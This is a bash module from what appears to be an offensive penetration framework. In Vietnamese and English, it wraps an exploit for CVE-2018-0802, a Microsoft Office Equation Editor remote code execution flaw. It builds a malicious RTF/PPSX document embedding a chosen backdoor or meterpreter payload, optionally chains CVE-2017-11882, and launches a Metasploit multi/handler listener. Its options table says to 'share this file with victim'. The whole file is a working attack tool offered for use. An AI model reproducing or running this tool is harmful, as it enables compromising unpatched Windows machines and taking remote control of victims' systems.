############## info ###############
###################################
function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2018-0802 | Lỗ hổng thực thi mã từ xa của Microsoft Office
     Mô-đun: exploit/windows/fileformat/CVE-2018-0802_office_rce
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Không
    Công bố: 01/09/2018

Cung cấp bởi:
  @rxwx

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   Tất cả các phiên bản chưa được vá lỗi của Microsoft Office được liệt kê ở dưới :
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
	   Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions
	   Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions
	   Microsoft Office Compatibility Pack Service Pack 3
	   Microsoft Word 2007 Service Pack 3
	   Microsoft Word 2010 Service Pack 2 (32-bit editions)
	   Microsoft Word 2010 Service Pack 2 (64-bit editions)
	   Microsoft Word 2013 RT Service Pack 1
	   Microsoft Word 2013 Service Pack 1 (32-bit editions)
	   Microsoft Word 2013 Service Pack 1 (64-bit editions)
	   Microsoft Word 2016 (32-bit edition)
	   Microsoft Word 2016 (64-bit edition)
!
module_compare
cat << !
Miêu tả:
   Đây là bản nâng cấp của lổ hổng bảo mật CVE-2017-11882 dạng  
   tràn ngăn xếp. Lỗ hổng này sẽ chỉ hoạt động trên các hệ thống đã được 
   cập nhật bản vá lỗi CVE-2017-1182 (EQNEDT32.EXE phiên bản 2017.8.14.0
   hoặc hơn).
   Cách khai thác lỗ hổng này tương tự như lỗ hổng thực thi mã từ xa
   CVE-2017-11882 bằng cách sử dụng một lỗ hổng trong quy trình
   Office Equation 3.0 (EQNEDT32.EXE) đã được phát hiện bởi Embedi.
   Dữ liệu đối tượng đầu tiên của tệp tài liệu đang sử dụng Packager.dll
   để chèn tệp thực thi độc hại vào thư mục %TEMP%. Tệp thực thi độc hại có 
   độ dài 0x000868B6 sẽ được chèn trong thư mục %TEMP%.
   Tệp thực thi độc hại sẽ được thực thi thông qua Microsoft Windows command shell.

Tham khảo:
   https://www.zscaler.com/blogs/research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot
   http://ith4cker.com/content/uploadfile/201801/d4831515864319.pdf
   https://research.checkpoint.com/another-office-equation-rce-vulnerability/
   https://nvd.nist.gov/vuln/detail/CVE-2018-0802
   https://github.com/rxwx/CVE-2018-0802

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2018-0802 | Microsoft Office Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2018-0802_office_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
  Disclosed: 01/09/2018

Provided by:
  @rxwx

Available targets:
   Id  Name
   --  ----
   0   All unpatched versions of Microsoft Office programs are listed below:
	   Microsoft Office 2007 Service Pack 3
	   Microsoft Office 2010 Service Pack 2 (32-bit editions)
	   Microsoft Office 2010 Service Pack 2 (64-bit editions)
	   Microsoft Office 2013 Service Pack 1 (32-bit editions)
	   Microsoft Office 2013 Service Pack 1 (64-bit editions)
	   Microsoft Office 2016 (32-bit edition)
	   Microsoft Office 2016 (64-bit edition)
	   Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions
	   Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions
	   Microsoft Office Compatibility Pack Service Pack 3
	   Microsoft Word 2007 Service Pack 3
	   Microsoft Word 2010 Service Pack 2 (32-bit editions)
	   Microsoft Word 2010 Service Pack 2 (64-bit editions)
	   Microsoft Word 2013 RT Service Pack 1
	   Microsoft Word 2013 Service Pack 1 (32-bit editions)
	   Microsoft Word 2013 Service Pack 1 (64-bit editions)
	   Microsoft Word 2016 (32-bit edition)
	   Microsoft Word 2016 (64-bit edition)
!
module_compare
cat << !
Description:
   This exploit is a CVE-2017-11882 patch bypass vulnerability
   of type stack overflow. This vulnerability will only work on 
   systems updated with CVE-2017-1182 patch (EQNEDT32.EXE 
   version 2017.8.14.0 or more).
   The logic behind this loophole is similar to the remote code execution
   vulnerability (CVE-2017-11882) in the Office Equation 3.0 process
   (EQNEDT32.EXE) was discovered by Embedi
   The first object data of the document file is using Packager.dll 
   to drop the file into the %TEMP% directory. The malicious executable file, 
   having the length 0x000868B6, will be dropped in the %TEMP%
   directory.
   Like CVE-2017-11882, the actual data for this vulnerability is in
   the equation native stream of the OLE object
   The dropped file %temp%\price.exe will be executed
   via the Microsoft Windows command shell.

References:
   https://www.zscaler.com/blogs/research/cve-2017-8570-and-cve-2018-0802-exploits-being-used-spread-lokibot
   http://ith4cker.com/content/uploadfile/201801/d4831515864319.pdf
   https://research.checkpoint.com/another-office-equation-rce-vulnerability/
   https://nvd.nist.gov/vuln/detail/CVE-2018-0802
   https://github.com/rxwx/CVE-2018-0802

!
fi
############ Hàm gán giá trị các biến #####################
}
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	file_name="CVE-2018-0802.rtf"
	type_file="RTF"
	backdoor_file=""
	double="false"
	file_name_lenght=18
	backdoor_file_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {

i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
################## nếu biến có độ dài nhỏ hơn 18 thì vẫn lấy giá trị 18 ###############
if [[ $file_name_lenght -le 18 ]]; then
	file_name_lenght=18
fi
if [[ $backdoor_file_lenght -le 18 ]]; then
	backdoor_file_lenght=18
fi
plus_strings=`expr $backdoor_file_lenght + $file_name_lenght`
if  [[ "$plus_strings" -le 36 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "file_name" ]] || [[ "$new_processing_variables" = "FILE_NAME" ]] || [[ "$new_processing_variables" = "File_name" ]]; then
			############# xóa biến và gán lại biến ################
			unset file_name
			file_name=$module_set
			file_name_lenght=`echo $file_name | awk '{print length}'`
			if [[ $file_name_lenght -le 18 ]]; then
				file_name_lenght=18
			fi
			################# nhận dạng đuôi file ra ###################
			type=`echo $file_name | cut -d'.' -f2` > /dev/null 2>&1
			if  [ "$type" = "rtf" ]; then
				type_file="RTF"
			elif [ "$type" = "ppsx" ]; then
				type_file="PPSX"
			elif [ "$type" = "doc" ]; then
				type_file="DOC"
			fi

			elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
			
			elif [[ "$new_processing_variables" = "double" ]] || [[ "$new_processing_variables" = "DOUBLE" ]] || [[ "$new_processing_variables" = "Double" ]]; then
				if [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]] || [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset double
				double="$module_set"
				else 	failed_to_validate=" The following options failed to validate: Value '$module_set' is not valid for option '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
				fi
		else echo ""

		fi
}
##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 20 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value

double=`echo $double`
double_lenght=`echo $double | awk '{print length}'`
	integer=`expr 20 - $double_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	double=$double$myvar
unset_value

module_banner_1
}
############# Khi các biến có độ dài lớn hơn 18 ###############
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare=`expr $file_name_lenght - $backdoor_file_lenght`
if [[ $subtract_compare -gt 0 ]]; then
	integer=3
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
	subtract_compare_value=`expr $file_name_lenght - $backdoor_file_lenght + 3`		
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
	
	greater_value=$file_name_lenght
else 
	integer=3
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
	subtract_compare_value=`expr $backdoor_file_lenght - $file_name_lenght + 3`		
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
	myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
	
	greater_value=$backdoor_file_lenght
fi

double=`echo $double`
double_lenght=`echo $double | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $double_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	double=$double$myvar
unset_value


subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
############ Opstions ##############
####################################
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2018-0802_office_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   File_name      $file_name$yes       Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   Backdoor_file  $backdoor_file$yes       Đường dẫn đến tệp thực thi / shell meterpreter / payload
   Double	  $double$no     Đồng thời khai thác cả CVE-2018-0802 và CVE-2017-11882.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2018-0802_office_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   File_name      $file_name$yes       Name of malicious RTF/PPSX file (Share this file with victim).
   Backdoor_file  $backdoor_file$yes       Path of an executable file / meterpreter shell / payload.
   Double	  $double$no       Exploits both CVE-2018-0802 and CVE-2017-11882 in the same document.

!
fi
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có "
no="  Không "
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2018-0802_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   File_name      $file_name$yes       Tên của tệp RTF / PPSX độc hại (Hãy chia sẻ tệp này!).
   Backdoor_file  $backdoor_file$yes       Đường dẫn đến tệp thực thi / shell meterpreter / payload
   Double	  $double$no    Đồng thời khai thác cả CVE-2018-0802 và CVE-2017-11882.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2018-0802_office_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   File_name      $file_name$yes     Name of malicious RTF/PPSX file (Share this file with victim).
   Backdoor_file  $backdoor_file$yes     Path of an executable file / meterpreter shell / payload.
   Double	  $double$no     Exploits both CVE-2018-0802 and CVE-2017-11882 in the same document.

!
fi
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Các phiên bản chưa được vá lỗi của Microsoft Office 2007,2010,2013,2016

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Unpatched versions of Microsoft Office 2007,2010,2013,2016

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
############### output #######################
###############################################
function output_massage {
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ------------------++-----------------------------------------------------------
    Tên file        ||  $file_name        			                 
    Loại tệp        ||  $type_file       	                                         
    Vị trí lưu file ||  $output_file/$file_name    	  	 
  ------------------++-----------------------------------------------------------


!
elif [ "$language" = "EN" ]; then
cat << !

  ------------------++-----------------------------------------------------------
    File name       ||  $file_name        			                 
    File type       ||  $type_file       	                                 
    File location   ||  $output_file/$file_name    	  	 		 
  ------------------++-----------------------------------------------------------


!
fi
echo -e "$RESET"
}
############### run ######################
##########################################
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
}
function module_run {
out_value

module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file
touch $rc_file
echo "use multi/handler" >> $rc_file
}
function attack {
path_present=`pwd`	 ### /Death-Note/Modules/Vul
cd $path_present/../../output
output_file=`pwd`     ### /Death-Note/ouput
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2018-0802/"
echo "exploit -j -z" >> $rc_file
cd $path_tool
service postgresql start
if [[ "$double" = "true" ]] || [[ "$double" = "TRUE" ]] || [[ "$double" = "True" ]]; then
xterm -e python packager_exec_CVE-2018-0802.py -e $backdoor_file -o $file_name -d
else
xterm -e python packager_exec_CVE-2018-0802.py -e $backdoor_file -o $file_name
fi	
check_file=`find -name $file_name`
if [[ "$check_file" != "" ]]; then
mv $path_tool/$file_name $output_file
output_massage
	cd ../../../Victim
	msfconsole -q -r $rc_file
	cd $path_present
else
	cd $path_present
	echo "$error_gen_file"

fi

}
